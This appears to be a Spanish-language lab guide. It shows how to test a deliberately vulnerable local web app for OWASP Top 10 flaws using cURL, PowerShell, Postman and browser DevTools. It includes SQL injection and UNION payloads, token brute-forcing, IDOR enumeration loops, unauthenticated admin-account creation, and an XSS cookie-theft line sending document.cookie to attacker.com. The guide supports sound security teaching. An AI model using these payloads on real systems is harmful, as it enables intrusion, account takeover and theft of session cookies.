# 🔧 EJEMPLOS DE PRUEBAS - cURL y DevTools

## Usando cURL (Terminal)

cURL es una herramienta para hacer requests HTTP desde la terminal. Perfecta para testear sin interfaz web.

---

## 1️⃣ SQL INJECTION

### Bypass básico
```powershell
curl "http://localhost:3000/users/search?username=admin' --"
```

**Resultado esperado:**
```json
{"id":1,"username":"admin","email":"admin@example.com"}
```

### UNION-based SQL Injection
```powershell
curl "http://localhost:3000/users/search?username=' UNION SELECT 1,username,email FROM users --"
```

### Time-based (comentario)
```powershell
curl "http://localhost:3000/users/search?username=admin' OR '1'='1"
```

---

## 2️⃣ BROKEN AUTHENTICATION

### Login
```powershell
curl -X POST http://localhost:3000/login `
  -H "Content-Type: application/json" `
  -d '{\"username\":\"admin\",\"password\":\"password123\"}'
```

**Resultado:**
```json
{"success":true,"token":"MQ=="}
```

### Decodificar token en PowerShell
```powershell
# Decodificar base64
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MQ=="))
# Resultado: 1
```

### Fuerza bruta de tokens
```powershell
# Generar tokens para IDs 1-10
for ($i=1; $i -le 10; $i++) {
  $token = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($i.ToString()))
  Write-Host "ID: $i → Token: $token"
}
```

---

## 3️⃣ XSS (Cross-Site Scripting)

### Probar en navegador (DevTools Console)

```javascript
// Alertas básicas
alert('XSS Test 1');

// Con acceso a cookies
console.log('Cookies:', document.cookie);

// Simulación de robo de cookies
fetch('http://attacker.com/steal?cookie=' + document.cookie);
```

### En URL (si fuera vulnerable a Reflected XSS)
```
http://localhost:3000/search?q=<img src=x onerror="alert('xss')">
```

---

## 4️⃣ INSECURE DIRECT OBJECT REFERENCES (IDOR)

### Ver nota 1 (acceso directo)
```powershell
curl "http://localhost:3000/notes/1"
```

**Resultado:**
```json
{
  "id": 1,
  "user_id": 1,
  "title": "Admin Notes",
  "content": "Configuración del servidor"
}
```

### Enumerar notas (1-10)
```powershell
# PowerShell
for ($i=1; $i -le 10; $i++) {
  Write-Host "=== Nota $i ===" 
  curl "http://localhost:3000/notes/$i"
  Write-Host ""
}
```

### Bash
```bash
for i in {1..10}; do
  echo "=== Nota $i ==="
  curl "http://localhost:3000/notes/$i"
done
```

---

## 5️⃣ SECURITY MISCONFIGURATION

### Ver información de debug
```powershell
curl "http://localhost:3000/debug"
```

**Resultado:**
```json
{
  "environment": "development",
  "databasePath": ":memory:",
  "secretKey": "super-secret-key-12345",
  "users": "SELECT * FROM users"
}
```

---

## 6️⃣ SENSITIVE DATA EXPOSURE

### Obtener datos de usuario (incluyendo password hash)
```powershell
curl "http://localhost:3000/api/user/1"
```

**Resultado:**
```json
{
  "id": 1,
  "username": "admin",
  "password": "$2a$10$...",
  "email": "admin@example.com",
  "role": "admin"
}
```

### Enumerar usuarios (1-10)
```powershell
for ($i=1; $i -le 10; $i++) {
  Write-Host "--- Usuario $i ---"
  curl "http://localhost:3000/api/user/$i"
}
```

---

## 7️⃣ MISSING ACCESS CONTROLS

### Crear usuario como admin (sin autenticación)
```powershell
curl -X POST "http://localhost:3000/admin/users" `
  -H "Content-Type: application/json" `
  -d '{
    "username": "hacker",
    "email": "hacker@evil.com",
    "role": "admin"
  }'
```

**Resultado:**
```json
{"success":true,"userId":3}
```

### Crear múltiples usuarios
```powershell
# Crear 5 usuarios admin
for ($i=1; $i -le 5; $i++) {
  $body = @{
    username = "hacker$i"
    email = "hacker$i@evil.com"
    role = "admin"
  } | ConvertTo-Json
  
  curl -X POST "http://localhost:3000/admin/users" `
    -H "Content-Type: application/json" `
    -d $body
}
```

---

## 8️⃣ USING COMPONENTS WITH KNOWN VULNERABILITIES

### Revisar versiones
```powershell
cd vulnerable-app
npm list express sqlite3 bcryptjs
```

### Audit de seguridad
```powershell
npm audit
```

**Salida típica:**
```
26 packages are looking for funding
0 vulnerabilities found
```

---

## 🎯 SCRIPT COMPLETO DE PRUEBAS

Crea un archivo `test-all.ps1`:

```powershell
# Script para testear todas las vulnerabilidades

$BASE_URL = "http://localhost:3000"

Write-Host "========================================" -ForegroundColor Cyan
Write-Host "Pruebas de Seguridad OWASP Top 10"
Write-Host "========================================" -ForegroundColor Cyan
Write-Host ""

# 1. SQL Injection
Write-Host "[1] SQL Injection" -ForegroundColor Yellow
Write-Host "Payload: admin' --"
curl "$BASE_URL/users/search?username=admin' --"
Write-Host ""

# 2. Login (Broken Auth)
Write-Host "[2] Broken Authentication" -ForegroundColor Yellow
Write-Host "Credenciales: admin / password123"
curl -X POST "$BASE_URL/login" `
  -H "Content-Type: application/json" `
  -d '{"username":"admin","password":"password123"}'
Write-Host ""

# 3. Debug Info
Write-Host "[3] Security Misconfiguration" -ForegroundColor Yellow
curl "$BASE_URL/debug"
Write-Host ""

# 4. IDOR
Write-Host "[4] Insecure Direct Object References" -ForegroundColor Yellow
curl "$BASE_URL/notes/1"
Write-Host ""

# 5. Sensitive Data
Write-Host "[5] Sensitive Data Exposure" -ForegroundColor Yellow
curl "$BASE_URL/api/user/1"
Write-Host ""

# 6. Admin Panel
Write-Host "[6] Missing Access Controls" -ForegroundColor Yellow
Write-Host "Intentando crear usuario admin sin permisos..."
curl -X POST "$BASE_URL/admin/users" `
  -H "Content-Type: application/json" `
  -d '{"username":"hacker","email":"hacker@evil.com","role":"admin"}'
Write-Host ""

Write-Host "========================================" -ForegroundColor Cyan
Write-Host "Pruebas completadas"
Write-Host "========================================" -ForegroundColor Cyan
```

**Ejecutar:**
```powershell
.\test-all.ps1
```

---

## 🌐 USANDO POSTMAN

### 1. Descargar Postman
https://www.postman.com/downloads/

### 2. Crear Collection

Importa esta colección JSON en Postman:

```json
{
  "info": {
    "name": "OWASP Vulnerable App",
    "version": "1.0"
  },
  "item": [
    {
      "name": "SQL Injection",
      "request": {
        "method": "GET",
        "url": "{{base_url}}/users/search?username=admin' --"
      }
    },
    {
      "name": "Login",
      "request": {
        "method": "POST",
        "header": [
          {
            "key": "Content-Type",
            "value": "application/json"
          }
        ],
        "body": {
          "raw": "{\"username\":\"admin\",\"password\":\"password123\"}"
        },
        "url": "{{base_url}}/login"
      }
    },
    {
      "name": "Debug Info",
      "request": {
        "method": "GET",
        "url": "{{base_url}}/debug"
      }
    },
    {
      "name": "IDOR - Get Note 1",
      "request": {
        "method": "GET",
        "url": "{{base_url}}/notes/1"
      }
    },
    {
      "name": "Sensitive Data - Get User 1",
      "request": {
        "method": "GET",
        "url": "{{base_url}}/api/user/1"
      }
    },
    {
      "name": "Missing Access - Create Admin",
      "request": {
        "method": "POST",
        "header": [
          {
            "key": "Content-Type",
            "value": "application/json"
          }
        ],
        "body": {
          "raw": "{\"username\":\"hacker\",\"email\":\"hacker@evil.com\",\"role\":\"admin\"}"
        },
        "url": "{{base_url}}/admin/users"
      }
    }
  ]
}
```

### 3. Configurar Variable
- Click `Environments` → New
- Nombre: `OWASP`
- Variable: `base_url` = `http://localhost:3000`

---

## 🔍 USANDO FIREFOX DEVTOOLS

### Tabs Útiles:

**1. Network Tab**
- Abre DevTools: `F12`
- Tab: `Network`
- Hacer clic en "Ver Perfil"
- Ver requests/responses

**2. Console Tab**
- Ejecutar: `document.cookie`
- Ver: Cookies de sesión
- Probar: `alert('test')`

**3. Inspector Tab**
- Inspeccionar elemento
- Ver HTML sin sanitizar
- Buscar `<script>` tags

**4. Storage Tab**
- Ver: LocalStorage, SessionStorage, Cookies
- Verificar: Cómo se guarda el token

---

## 📊 CAPTURA DE DATOS

### Guardar respuesta en archivo
```powershell
curl "http://localhost:3000/api/user/1" | Out-File -FilePath "user1.json"
```

### Capturar todas las respuestas
```powershell
# Crear carpeta
mkdir ".\capturas"

# Guardar cada endpoint
curl "http://localhost:3000/debug" > ".\capturas\debug.json"
curl "http://localhost:3000/notes/1" > ".\capturas\note1.json"
curl "http://localhost:3000/api/user/1" > ".\capturas\user1.json"
```

---

## 🎓 BUENAS PRÁCTICAS

### 1. Documentar todo
- Guardar respuestas JSON
- Tomar pantallas de DevTools
- Anotar pasos seguidos

### 2. Usar Variantes
- Prueba con IDs diferentes (1, 2, 3, ...)
- Intentar bypasses alternativos
- Probar límites del sistema

### 3. Comparar Seguro vs Vulnerable
- Notar diferencias
- Documentar por qué funciona
- Sugerir correcciones

---

**¡Con estos ejemplos puedes testear todas las vulnerabilidades!** 🚀

